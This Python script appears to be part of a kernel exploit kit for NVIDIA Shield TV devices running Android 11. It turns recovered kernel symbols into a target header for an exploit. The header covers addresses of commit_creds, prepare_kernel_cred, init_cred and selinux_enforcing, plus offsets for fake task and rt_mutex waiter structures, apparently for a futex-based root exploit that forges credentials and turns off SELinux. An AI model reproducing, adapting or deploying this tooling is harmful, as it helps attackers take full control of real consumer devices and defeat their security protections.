#!/usr/bin/env python3
"""Generate a Shield 9.2.4 target header from recovered kallsyms.

    vmlinux-to-elf <Image> vmlinux.elf
    aarch64-linux-gnu-nm -n vmlinux.elf > nm.txt
    generate_shield_target.py --device darcy nm.txt \
        exploit/targets/shield-darcy-9.2.4/target.h

SHARED holds everything not device-specific; darcy and mdarcy build from the
same source with the same layout-relevant config.
"""

from __future__ import annotations

import argparse
import re
from pathlib import Path

BASE = 0xFFFFFF8008080000

DEVICES = {
    "darcy": {
        "label": "shield_darcy_9.2.4_13961458",
        "fingerprint": (
            "NVIDIA/darcy/darcy:11/RQ1A.210105.003/"
            "13961458_4387.0822:user/release-keys"
        ),
        "banner": "NVIDIA Shield TV (darcy), Android 11, Linux 4.9.141-tegra",
    },
    "mdarcy": {
        "label": "shield_mdarcy_9.2.4_7825230",
        "fingerprint": (
            "NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/"
            "7825230_4387.0822:user/release-keys"
        ),
        "banner": "NVIDIA Shield TV Pro (mdarcy), Android 11, Linux 4.9.141-tegra",
    },
}

# macro -> kallsyms symbol
SYMBOL_MACROS = {
    "COMMIT_CREDS_OFF": "commit_creds",
    "PREPARE_KERNEL_CRED_OFF": "prepare_kernel_cred",
    "OVERRIDE_CREDS_OFF": "override_creds",
    "GET_TASK_CRED_OFF": "get_task_cred",
    "INIT_TASK_OFF": "init_task",
    "INIT_UTS_NS_OFF": "init_uts_ns",
    "INIT_CRED_OFF": "init_cred",
    "INIT_USER_NS_OFF": "init_user_ns",
    "INIT_GROUPS_OFF": "init_groups",
    "MEMSTART_ADDR_OFF": "memstart_addr",
    "MODULE_ALLOC_BASE_OFF": "module_alloc_base",
    "RESERVED_MEM_OFF": "reserved_mem",
    "EMPTY_ZERO_PAGE_OFF": "empty_zero_page",
    "ROOT_TASK_GROUP_OFF": "root_task_group",
    "KPTR_RESTRICT_OFF": "kptr_restrict",
    "SYSCALL_BOOTID_OFF": "sysctl_bootid",
    "NFULNL_LOGGER_OFF": "nfulnl_logger",
    "LOGGERS_0_1_OFF": "loggers",
    "ASHMEM_FOPS_OFF": "ashmem_fops",
    "ASHMEM_MISC_OFF": "ashmem_misc",
    "ASHMEM_IOCTL_OFF": "ashmem_ioctl",
    "ASHMEM_COMPAT_IOCTL_OFF": "compat_ashmem_ioctl",
    "ASHMEM_MMAP_OFF": "ashmem_mmap",
    "ASHMEM_OPEN_OFF": "ashmem_open",
    "ASHMEM_RELEASE_OFF": "ashmem_release",
    "ASHMEM_READ_ITER_OFF": "ashmem_read",
    "ASHMEM_LLSEEK_OFF": "ashmem_llseek",
    "NOOP_LLSEEK_OFF": "noop_llseek",
    "GENERIC_FILE_LLSEEK_OFF": "generic_file_llseek",
    "GENERIC_FILE_SPLICE_READ_OFF": "generic_file_splice_read",
    "DEFAULT_FILE_SPLICE_READ_OFF": "default_file_splice_read",
    "KERNEL_WRITE_OFF": "kernel_write",
    "FGET_OFF": "fget",
    "FPUT_OFF": "fput",
    "SYS_IOCTL_OFF": "sys_ioctl",
    "CONFIGFS_READ_FILE_OFF": "configfs_read_file",
    "CONFIGFS_WRITE_FILE_OFF": "configfs_write_file",
    "CONFIGFS_READ_BIN_FILE_OFF": "configfs_read_bin_file",
    "CONFIGFS_WRITE_BIN_FILE_OFF": "configfs_write_bin_file",
    "CONFIGFS_OPEN_BIN_FILE_OFF": "configfs_open_bin_file",
    "CONFIGFS_RELEASE_BIN_FILE_OFF": "configfs_release_bin_file",
    "KMALLOC_CACHES_OFF": "kmalloc_caches",
    "ANON_PIPE_BUF_OPS_OFF": "anon_pipe_buf_ops",
    "ANON_PIPE_BUF_NOMERGE_OPS_OFF": "anon_pipe_buf_ops",
    "SELINUX_STATE_OFF": "selinux_enforcing",
    "SELINUX_ENFORCING_BOOT_OFF": "selinux_enforcing",
    "SECURITY_HOOK_HEADS_OFF": "security_hook_heads",
    "RT_MUTEX_START_PROXY_LOCK_OFF": "rt_mutex_start_proxy_lock",
    "REMOVE_WAITER_OFF": "remove_waiter",
    "RT_MUTEX_SLOWLOCK_OFF": "rt_mutex_slowlock",
    "RT_MUTEX_SETPRIO_OFF": "rt_mutex_setprio",
    "FUTEX_REQUEUE_OFF": "futex_requeue",
    "FUTEX_LOCK_PI_OFF": "futex_lock_pi",
    "FUTEX_WAKE_OFF": "futex_wake",
    "KALLSYMS_LOOKUP_NAME_OFF": "kallsyms_lookup_name",
    "SLIDE_NFULNL_LOGGER_OFF": "nfulnl_logger",
    "SLIDE_SYSCTL_BOOTID_OFF": "sysctl_bootid",
    "SLIDE_INIT_TASK_OFF": "init_task",
    "SLIDE_ROOT_TASK_GROUP_OFF": "root_task_group",
}

# 39-bit VA, 3 GiB DRAM at 0x80000000, plus every struct offset used.
SHARED = {
    "KIMAGE_TEXT_BASE": "0xffffff8008080000ULL",
    "P0_PAGE_OFFSET": "0xffffffc000000000ULL",
    "P0_PHYS_OFFSET": "0x80000000ULL",
    "P0_KERNEL_PHYS_LOAD": "0x80080000ULL",
    "KERNELSNITCH_IDENTITY_START": "0xffffffc000000000ULL",
    "KERNELSNITCH_IDENTITY_END": "0xffffffc0c0000000ULL",
    "DIRECT_MAP_BASE": "0xffffffc000000000ULL",
    "DIRECT_MAP_END": "0xffffffc0c0000000ULL",
    "VMEMMAP_START": "0xffffffbf00000000ULL",
    "PSELECT_WAITER_WORD_SHIFT": "2",
    "TASK_PI_USES_LEFTMOST": "1",
    "CONFIGFS_BUFFER_HAS_CB_MAX": "0",
    "ASHMEM_SHOW_FDINFO": "0",
    "SLIDE_WONLY_BOOTID": "1",
    "MARK_WAKEUP_NEXT_WAITER_OFF": "0x00000000ULL /* inlined on 4.9 */",
    "SELINUX_CRED_BLOB_OFF": "0",
    "SELINUX_CRED_OSID_OFF": "0",
    "SELINUX_CRED_SID_OFF": "4",
    "SELINUX_KERNEL_SID": "1",
    "LOCK_OFF": "0x1350",
    "W0_OFF": "0x2220",
    "FOPS_OFF": "0x1000",
    "FOPS_TABLE_OFF": "FOPS_OFF",
    "SCRATCH_OFF": "0x3000",
    "RIGHT_OFF": "0x4440",
    "LEFT_OFF": "0x5550",
    "FAKE_TASK_OFF": "0x3200",
    "FAKE_WAITER_TREE_ENTRY_OFF": "0x00",
    "FAKE_WAITER_TREE_PRIO_OFF": "0x40",
    "FAKE_WAITER_TREE_DEADLINE_OFF": "0x48",
    "FAKE_WAITER_PI_TREE_ENTRY_OFF": "0x18",
    "FAKE_WAITER_PI_TREE_PRIO_OFF": "0x40",
    "FAKE_WAITER_PI_TREE_DEADLINE_OFF": "0x48",
    "FAKE_WAITER_TASK_OFF": "0x30",
    "FAKE_WAITER_LOCK_OFF": "0x38",
    "FAKE_WAITER_WAKE_STATE_OFF": "0x50",
    "FAKE_WAITER_WW_CTX_OFF": "0x58",
    "FAKE_TASK_USAGE_OFF": "48",
    "FAKE_TASK_PRIO_OFF": "112",
    "FAKE_TASK_NORMAL_PRIO_OFF": "120",
    "FAKE_TASK_TASK_GROUP_OFF": "840",
    "FAKE_TASK_PI_LOCK_OFF": "2020",
    "FAKE_TASK_PI_WAITERS_OFF": "2032",
    "FAKE_TASK_PI_TOP_TASK_OFF": "2040",
    "FAKE_TASK_PI_BLOCKED_ON_OFF": "2048",
    "CRED_SECUREBITS_OFF": "36",
    "CRED_CAPS_OFF": "40",
    "SECCOMP_MODE_OFF": "0x00",
    "SECCOMP_FILTER_COUNT_OFF": "0x04",
    "SECCOMP_FILTER_OFF": "0x08",
    "TIF_SECCOMP_BIT": "11",
    "PFA_NO_NEW_PRIVS_BIT": "0",
    "WAITER_TREE_ENTRY_OFF": "0x00   /* struct rb_node */",
    "WAITER_PI_TREE_ENTRY_OFF": "0x18 /* struct rb_node */",
    "WAITER_TASK_OFF": "0x30",
    "WAITER_LOCK_OFF": "0x38",
    "WAITER_PRIO_OFF": "0x40",
    "WAITER_DEADLINE_OFF": "0x48",
    "WAITER_SIZE": "0x50",
    "RT_MUTEX_WAIT_LOCK_OFF": "0x00",
    "RT_MUTEX_WAITERS_OFF": "0x08   /* rb_root(0x08) + waiters_leftmost(0x10) */",
    "RT_MUTEX_OWNER_OFF": "0x18",
    "TASK_PID_OFF": "1368",
    "TASK_TGID_OFF": "1372",
    "TASK_REAL_PARENT_OFF": "1376",
    "TASK_PARENT_OFF": "1384",
    "TASK_TASKS_OFF": "1112",
    "TASK_THREAD_GROUP_OFF": "1536",
    "TASK_MM_OFF": "1192",
    "TASK_ACTIVE_MM_OFF": "1200",
    "TASK_REAL_CRED_OFF": "1808",
    "TASK_CRED_OFF": "1816",
    "TASK_COMM_OFF": "1824",
    "TASK_FILES_OFF": "1864",
    "TASK_NSPROXY_OFF": "1872",
    "TASK_SIGNAL_OFF": "1880",
    "TASK_THREAD_OFF": "2520",
    "TASK_STACK_OFF": "40",
    "TASK_TI_FLAGS_OFF": "0",
    "TASK_TI_PREEMPT_OFF": "16",
    "TASK_TI_ADDR_LIMIT_OFF": "8",
    "TASK_PI_LOCK_OFF": "2020",
    "TASK_PI_WAITERS_OFF": "2032",
    "TASK_PI_TOP_TASK_OFF": "2040",
    "TASK_PI_BLOCKED_ON_OFF": "2048",
    "TASK_ATOMIC_FLAGS_OFF": "1312",
    "TASK_PRIO_OFF": "112",
    "TASK_STATIC_PRIO_OFF": "116",
    "TASK_NORMAL_PRIO_OFF": "120",
    "TASK_RT_PRIORITY_OFF": "124",
    "TASK_SIZE": "3520",
    "TASK_THREAD_INFO_FLAGS_OFF": "0",
    "TASK_SECCOMP_OFF": "1992",
    "THREAD_INFO_FLAGS_OFF": "0x00",
    "THREAD_INFO_ADDR_LIMIT_OFF": "0x08",
    "THREAD_INFO_PREEMPT_OFF": "0x18",
    "CRED_USAGE_OFF": "0",
    "CRED_UID_OFF": "4",
    "CRED_GID_OFF": "8",
    "CRED_SUID_OFF": "12",
    "CRED_SGID_OFF": "16",
    "CRED_EUID_OFF": "20",
    "CRED_EGID_OFF": "24",
    "CRED_FSUID_OFF": "28",
    "CRED_FSGID_OFF": "32",
    "CRED_SECURITY_OFF": "120",
    "CRED_SIZE": "168",
    "PIPE_BUFFER_PAGE_OFF": "0x00",
    "PIPE_BUFFER_OFFSET_OFF": "0x08",
    "PIPE_BUFFER_LEN_OFF": "0x0c",
    "PIPE_BUFFER_OPS_OFF": "0x10",
    "PIPE_BUFFER_FLAGS_OFF": "0x18",
    "PIPE_BUFFER_PRIVATE_OFF": "0x20",
    "PIPE_BUFFER_SIZE": "0x28",
    "PIPE_BUFFER_SLOTS": "16",
    "PIPE_BUF_FLAG_CAN_MERGE": "0x10",
    "PIPE_INODE_INFO_STRUCT_SIZE": "0x90",
    "PIPE_INODE_INFO_SIZE": "0x90",
    "PIPE_INODE_INFO_SLOTS_PER_PAGE": "21",
    "PIPE_NRB_UFS_OFF": "0x40",
    "PIPE_CURBUF_OFF": "0x44",
    "PIPE_BUFFERS_OFF": "0x48",
    "PIPE_READERS_OFF": "0x4c",
    "PIPE_WRITERS_OFF": "0x50",
    "PIPE_FILES_OFF": "0x54",
    "PIPE_TMP_PAGE_OFF": "0x68",
    "PIPE_BUFS_OFF": "0x80",
    "PIPE_USER_OFF": "0x88",
    "FILE_F_PATH_OFF": "16",
    "FILE_F_OP_OFF": "40",
    "FILE_F_FLAGS_OFF": "64",
    "FILE_F_MODE_OFF": "68",
    "FILE_F_MAPPING_OFF": "248",
    "PATH_MNT_OFF": "0",
    "PATH_DENTRY_OFF": "8",
    "DENTRY_D_FLAGS_OFF": "0",
    "DENTRY_D_NAME_OFF": "32",
    "DENTRY_D_INODE_OFF": "48",
    "INODE_I_MODE_OFF": "0",
    "INODE_I_UID_OFF": "4",
    "INODE_I_MAPPING_OFF": "48",
    "INODE_I_OP_OFF": "32",
    "INODE_I_FOP_OFF": "360",
    "FD_TABLE_FDT_OFF": "32",
    "FD_TABLE_FDTAB_OFF": "40",
    "FDT_FD_OFF": "8",
    "NS_PROXY_UTS_OFF": "8",
    "NS_PROXY_IPC_OFF": "16",
    "NS_PROXY_MNT_OFF": "24",
    "NS_PROXY_NET_OFF": "40",
    "COMMON_INUM_OFF": "16",
    "SEQ_FILE_BUF_OFF": "0",
    "SEQ_FILE_SIZE_OFF": "8",
    "SEQ_FILE_FROM_OFF": "16",
    "SEQ_FILE_COUNT_OFF": "24",
    "SEQ_FILE_OP_OFF": "104",
    "SEQ_FILE_PRIVATE_OFF": "128",
    "MM_CONTEXT_ID_OFF": "720",
    "MM_OWNER_OFF": "768",
    "VMA_VM_MM_OFF": "64",
    "VMA_VM_FLAGS_OFF": "80",
    "CFG_COUNT_OFF": "0x00",
    "CFG_POS_OFF": "0x08",
    "CFG_PAGE_OFF": "0x10",
    "CFG_OPS_OFF": "0x18",
    "CFG_MUTEX_OFF": "0x20",
    "CFG_MUTEX_COUNT_OFF": "0x20",
    "CFG_MUTEX_WAIT_LOCK_OFF": "0x24",
    "CFG_MUTEX_WAIT_LIST_OFF": "0x28",
    "CFG_MUTEX_OWNER_OFF": "0x38",
    "CFG_MUTEX_OSQ_OFF": "0x40",
    "CFG_NEEDS_READ_FILL_OFF": "0x48",
    "CFG_READ_IN_PROGRESS_OFF": "0x4c",
    "CFG_WRITE_IN_PROGRESS_OFF": "0x4d",
    "CFG_BIN_BUFFER_OFF": "0x50",
    "CFG_BIN_BUFFER_SIZE_OFF": "0x58",
    "CFG_CB_MAX_SIZE_OFF": "0x5c",
    "FOPS_OWNER_OFF": "0x00",
    "FOPS_LLSEEK_OFF": "0x08",
    "FOPS_READ_OFF": "0x10",
    "FOPS_WRITE_OFF": "0x18",
    "FOPS_READ_ITER_OFF": "0x20",
    "FOPS_WRITE_ITER_OFF": "0x28",
    "FOPS_ITERATE_OFF": "0x30",
    "FOPS_ITERATE_SHARED_OFF": "0x38",
    "FOPS_POLL_OFF": "0x40",
    "FOPS_UNLOCKED_IOCTL_OFF": "0x48",
    "FOPS_IOCTL_OFF": "FOPS_UNLOCKED_IOCTL_OFF",
    "FOPS_COMPAT_IOCTL_OFF": "0x50",
    "FOPS_MMAP_OFF": "0x58",
    "FOPS_OPEN_OFF": "0x60",
    "FOPS_FLUSH_OFF": "0x68",
    "FOPS_RELEASE_OFF": "0x70",
    "FOPS_FSYNC_OFF": "0x78",
    "FOPS_SPLICE_WRITE_OFF": "0xb0",
    "FOPS_SPLICE_READ_OFF": "0xb8",
    "FOPS_SHOW_FDINFO_OFF": "0xd0",
    "STRUCT_PAGE_SIZE": "0x40",
    "STRUCT_PAGE_COMPOUND_HEAD_OFF": "0x20",
    "STRUCT_PAGE_TYPE_OFF": "0x18",
    "STRUCT_SLAB_CACHE_OFF": "0x30",
}

CTL_TABLE_SIZE = 0x40
BOOT_ID_CTL_INDEX = 5
CTL_TABLE_DATA_OFF = 0x08
MISCDEVICE_FOPS_OFF = 0x10
NFPROTO_NUMPROTO = 13
NF_LOG_TYPE_MAX = 2
NF_LOG_TYPE_ULOG = 1


def load_symbols(path: Path) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        fields = line.split()
        if len(fields) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", fields[0]):
            symbols.setdefault(fields[-1], int(fields[0], 16))
    return symbols


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--device", required=True, choices=sorted(DEVICES))
    ap.add_argument("nm_file", type=Path)
    ap.add_argument("target_h", type=Path)
    args = ap.parse_args()

    dev = DEVICES[args.device]
    symbols = load_symbols(args.nm_file)

    missing = sorted(set(SYMBOL_MACROS.values()) - set(symbols))
    if missing:
        raise SystemExit(f"symbols absent from {args.nm_file}: {', '.join(missing)}")

    def off(sym: str, delta: int = 0) -> str:
        return f"0x{symbols[sym] + delta - BASE:08x}ULL"

    values = {macro: off(sym) for macro, sym in SYMBOL_MACROS.items()}
    values.update(SHARED)

    # struct miscdevice: fops pointer at 0x10.
    values["ASHMEM_MISC_FOPS_OFF"] = off("ashmem_misc", MISCDEVICE_FOPS_OFF)
    boot_id_data = BOOT_ID_CTL_INDEX * CTL_TABLE_SIZE + CTL_TABLE_DATA_OFF
    values["SLIDE_RANDOM_BOOT_ID_DATA_OFF"] = off("random_table", boot_id_data)
    # loggers[pf][ULOG] all hold &nfulnl_logger; the last slot keeps rb_erase's
    # collateral store in the padding after the array.
    ulog_slot = ((NFPROTO_NUMPROTO - 1) * NF_LOG_TYPE_MAX + NF_LOG_TYPE_ULOG) * 8
    values["SLIDE_LOGGERS_0_1_OFF"] = off("loggers", ulog_slot)

    enforcing = off("selinux_enforcing")
    values["SELINUX_ENFORCING"] = f"(KIMAGE_TEXT_BASE + {enforcing})"
    values["SELINUX_BLOB_SIZES"] = f"(KIMAGE_TEXT_BASE + {enforcing})"

    text = args.target_h.read_text(encoding="utf-8")
    for name, value in values.items():
        pattern = rf"(?m)^#define\s+{re.escape(name)}\s+.*$"
        text, count = re.subn(pattern, f"#define {name} {value}", text)
        if count == 0:
            raise SystemExit(f"macro not present in template: {name}")

    text = re.sub(
        r'(?m)^#define BUILD_VARIANT_LABEL .+$',
        f'#define BUILD_VARIANT_LABEL "{dev["label"]}"', text)
    text = re.sub(
        r'(?m)^#define BUILD_FINGERPRINT .+$',
        f'#define BUILD_FINGERPRINT "{dev["fingerprint"]}"', text)
    text = re.sub(
        r'(?m)^ \* NVIDIA Shield TV.*$', f' * {dev["banner"]}', text)

    rt = symbols["random_table"]
    text = re.sub(
        r'(?m)^ \* random_table = 0x[0-9a-f]+, sizeof\(struct ctl_table\) = 0x[0-9a-f]+,$',
        f' * random_table = 0x{rt:x}, sizeof(struct ctl_table) = 0x{CTL_TABLE_SIZE:x},',
        text)
    text = re.sub(
        r'(?m)^ \*   &random_table\[5\]\.data = 0x[0-9a-f]+\. \*/$',
        f' *   &random_table[{BOOT_ID_CTL_INDEX}].data = 0x{rt + boot_id_data:x}. */',
        text)
    text = re.sub(
        r'(?m)^ \* kallsyms: selinux_enforcing \(0x[0-9a-f]+\)\.$',
        f' * kallsyms: selinux_enforcing (0x{symbols["selinux_enforcing"]:x}).',
        text)

    args.target_h.write_text(text, encoding="utf-8", newline="\n")


if __name__ == "__main__":
    main()
